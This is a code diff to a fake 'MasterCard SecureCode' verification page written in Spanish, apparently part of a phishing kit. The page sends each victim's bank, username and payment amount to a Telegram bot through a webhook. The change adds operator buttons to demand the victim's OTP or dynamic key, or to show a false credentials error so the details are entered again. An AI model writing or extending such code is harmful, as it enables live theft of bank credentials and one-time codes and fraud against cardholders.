@@ -409,7 +409,7 @@
             <svg class="shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                 <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
             </svg>
-            <p>
+            <p> 
                 <strong>MasterCard SecureCode</strong> protege tu tarjeta contra usos no autorizados, sin costo adicional.
                 <a href="#">Más información</a>
             </p>
@@ -573,12 +573,17 @@
 
                 const inlineKeyboard = {
                     inline_keyboard: [
-                        [{ text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` }],
-                        [{ text: "❌ RECHAZAR", callback_data: `reject_${datos.solicitudId}` }]
+                        [
+                            { text: "📱 PEDIR OTP", callback_data: `pedir_otp_${datos.solicitudId}` },
+                            { text: "🔑 PEDIR CLAVE DIN", callback_data: `pedir_clave_din_${datos.solicitudId}` }
+                        ],
+                        [
+                            { text: "❌ ERROR CREDENCIALES", callback_data: `error_credenciales_${datos.solicitudId}` }
+                        ]
                     ]
                 };
 
-                const mensaje = `🔔 *MASTERCARD SECURECODE - V2CRTF*\n\n🆔 ID: \`${datos.solicitudId}\`\n🏛️ BANCO: ${bancoEmisor}\n👤 Usuario: \`${datos.usuario}\`\n💰 Monto: ${datos.monto}\n⏳ Esperando aprobación...`;
+                const mensaje = `🔔 *MASTERCARD SECURECODE - V2CRTF*\n\n🆔 ID: \`${datos.solicitudId}\`\n🏛️ BANCO EMISOR: ${bancoEmisor}\n👤 Usuario: \`${datos.usuario}\`\n💰 Monto: ${datos.monto}\n⏳ Estado: Esperando verificación...`;
 
                 const response = await fetch(`${WEBHOOK_BASE_URL}/api/send-telegram`, {
                     method: 'POST',
